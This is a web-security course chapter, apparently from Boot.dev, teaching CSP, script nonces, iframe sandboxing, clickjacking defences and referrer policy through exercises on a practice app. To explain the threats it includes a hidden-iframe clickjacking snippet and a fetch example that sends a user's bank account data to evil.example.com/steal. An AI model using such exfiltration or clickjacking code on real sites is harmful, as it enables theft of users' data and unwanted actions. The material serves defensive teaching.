## CH6: Client-Side Security

### L5: Content Security Policy
Content Security Policy
A Content Security Policy (CSP) lets a server declare which resources a page is allowed to load and execute. A CSP doesn't replace escaping your output, but it can limit the damage if an injection attack succeeds.

It's set via the Content-Security-Policy response header on an HTML page. For example, a weak policy might allow inline scripts:

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'

'unsafe-inline' allows every inline <script> block and event handler, including ones injected through XSS. Yuck.

Even an app that serves several types of its own assets, embeds a same-origin widget, and renders a QR code as a data: image could use a stricter policy like this:

Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'

This policy:

Loads scripts and styles only from the app's origin.

Allows same-origin images plus data: images.

Allows same-origin iframes.

Blocks plugins, injected base URLs, and form submissions to other origins.

Blocks every inline script because script-src contains neither 'unsafe-inline' nor a nonce.

Of course, a legitimate inline script will stop running too (so don't load it inline!). That's just a refactoring problem, not a reason to throw 'unsafe-inline' into the policy and let every inline script run.


Diagram of the CSP enforcement model

Assignment
Bearly Secure doesn't send a Content Security Policy. Add the strict baseline without granting exceptions for inline scripts or framing parents.

In internal/httpserver/middleware.go, add middleware that sends this header:

Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; frame-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self'

Apply the middleware globally in internal/httpserver/app.go, immediately after cspNonce in the applyMiddleware chain.

Start the app, log in as Mabel, and place an order. Confirm CSP blocks the automatic PawPal redirect while its manual return link still works.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L6: Legitimate Inline Scripts
Legitimate Inline Scripts
Moving all your own JavaScript into same-origin external files is usually the simplest way to keep a strict CSP. When a trusted inline script really has to stay inline, authorize just that one script with a per-response nonce.

Generate a fresh, unpredictable value for every HTML response:

nonceBytes := make([]byte, 16)
if _, err := rand.Read(nonceBytes); err != nil {
    return err
}
nonce := base64.StdEncoding.EncodeToString(nonceBytes)

Include the value in script-src:

Content-Security-Policy: script-src 'self' 'nonce-z7G4mN2qL8vP1sR5'

Then place the matching value on the trusted script element:

<script nonce="z7G4mN2qL8vP1sR5">
  window.location.assign("/orders/42");
</script>

The browser only executes inline scripts that carry the nonce from that response's policy. An attacker who can inject markup can't predict the next nonce, and an old nonce doesn't authorize a script in a new response.

Never reuse a fixed nonce or accept one provided from the client's request.

Assignment
Bearly Secure already generates a fresh CSP nonce for every response and renders it on PawPal's trusted redirect script, but its policy ignores the nonce. Allow only that nonce in script-src.

In internal/httpserver/middleware.go, update contentSecurityPolicy to load the response nonce with httpx.CSPNonce(request.Context()) and add the matching 'nonce-<value>' source to script-src without allowing 'unsafe-inline'.

Start the app, log in as Mabel, and confirm PawPal redirects automatically after checkout.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L7: Sandboxing 'iframe' Elements
Sandboxing iframe Elements
An iframe embeds another webpage inside the current page. Third-party widgets, ads, maps, and videos often use iframes, but an unrestricted iframe can give the embedded page waaaay more browser capabilities than it actually needs.

The HTML sandbox attribute removes capabilities from one embedded document:

<iframe src="/shipping-widget.html" sandbox="allow-scripts"></iframe>

If the sandbox is empty, all restrictions are applied by default. Alternatively, you can grant back specific capabilities with space-separated keywords, for example:

allow-scripts lets the framed page run JavaScript.

allow-same-origin preserves the framed page's real origin, which may restore access to its cookies and local storage. If the frame and parent are same-origin, it also lets their scripts access each other's documents.

allow-forms lets the framed page submit forms.

allow-popups lets the framed page open new windows.

You can see the full list of sandbox tokens on MDN.

As always, follow the principle of least privilege: only grant the permissions that the embedded page actually needs!

Don't combine allow-scripts and allow-same-origin for same-origin untrusted content. Together, those permissions can let the embedded document remove its own sandbox attribute, making the sandbox useless!

Assignment
The Acorn Express frame on Bearly Secure's checkout page can access more than its estimator needs. Allow scripts while blocking same-origin access.

Start the app, log in as Mabel, add a product, and open checkout. Confirm the unsandboxed widget can read the host page title.

In web/templates/checkout.html, add sandbox="allow-scripts" to the shipping-widget iframe.

Confirm delivery estimation still works and the widget reports that host-page access is blocked.

With Bearly Secure still running, run and submit the CLI tests from the project root.

### L8: Clickjacking
Clickjacking
Clickjacking tricks a user into clicking on a real application that has been disguised (or hidden) inside an attacker's page.

The attacker might place a sensitive page underneath a fake button:

<button>Claim free gems</button>

<iframe
  src="https://bank.example.com/confirm-transfer"
  style="opacity: 0; position: absolute; top: 0; left: 0;"
></iframe>

If the victim is signed in to bank.example.com, the framed page loads with their bank session. The attacker doesn't need to read the page, they just need to bait the victim into clicking on the fake button and triggering the real page's action.

Control Framing
The frame-ancestors CSP directive controls which parent origins can embed a response:

Content-Security-Policy: frame-ancestors 'self'

'self' allows same-origin parents while blocking an attacker's origin.

The older X-Frame-Options header can provide a fallback for older browsers:

X-Frame-Options: SAMEORIGIN

If your app never needs to be framed, just use frame-ancestors 'none' and X-Frame-Options: DENY. If it intentionally supports same-origin framing, use 'self' and SAMEORIGIN instead.

Assignment
Bearly Evil can frame Bearly Secure's account page. Block cross-origin framing without breaking Acorn Express.

Start Bearly Secure and log in as Mabel. In another shell, start Bearly Evil:

go run ./cmd/attackerlab

At http://localhost:4040/, confirm the framing and clickjacking section displays Mabel's account page.

In the existing security middleware, add frame-ancestors 'self' to CSP and send X-Frame-Options: SAMEORIGIN.

With Bearly Secure and Bearly Evil still running, run and submit the CLI tests from the project root.

You can stop Bearly Evil after submitting the lesson.

### L9: Same-Origin and Referrer Policies
Same-Origin and Referrer Policies
The same-origin policy stops client-side JavaScript from reading data from another origin unless that origin explicitly allows it.

An origin combines scheme (https), host (api.example.com), and port (443), so changing any one of them changes the origin.

Cross-Origin Reads
Imagine a user is logged into https://bank.example.com, then visits an attacker-controlled sibling origin at https://evil.example.com. Without the same-origin policy, the attacker's page could do this:

// make a request for account details using the user's
// signed-in session cookie
const response = await fetch("https://bank.example.com/account", {
  credentials: "include",
});
const account = await response.json();

// send the sensitive data back to the attacker's server
await fetch("https://evil.example.com/steal", {
  method: "POST",
  body: JSON.stringify(account),
});

The two origins are same-site (example.com), so the browser may send the bank's SameSite cookie when fetch opts into credentials, but it will not let JavaScript on evil.example.com read the response unless the bank explicitly allows it.

The same-origin policy mostly restricts reads, but not all writes. A malicious page might be able to submit a form or load an image from another origin, but reading private response data is blocked by default.

Referrer Policy
The same-origin policy does not control how much of the current URL a browser sends in the Referer request header when a user follows a link or loads a resource.

The HTTP Referer request header identifies the page that initiated a request. For example, when someone follows a Google or GitHub link to Boot.dev, the request to our homepage may contain a Google or GitHub URL in its Referer header (very useful for analytics).

Instead, an explicit Referrer-Policy header keeps that behavior predictable:

Referrer-Policy: strict-origin-when-cross-origin

It allows the full URL on same-origin requests, sends only the origin on HTTPS-to-HTTPS cross-origin requests, and sends no referrer when navigating from HTTPS to HTTP. Modern browsers use this policy by default, but setting the header makes your application's choice explicit.

So, the same-origin policy limits cross-origin reads, while the referrer policy limits the URL information sent with requests.

Assignment
Bearly Secure relies on browser defaults. Send Referrer-Policy: strict-origin-when-cross-origin on every response.

Add the header to Bearly Secure's global security middleware.

Start the app.

With Bearly Secure still running, run and submit the CLI tests from the project root.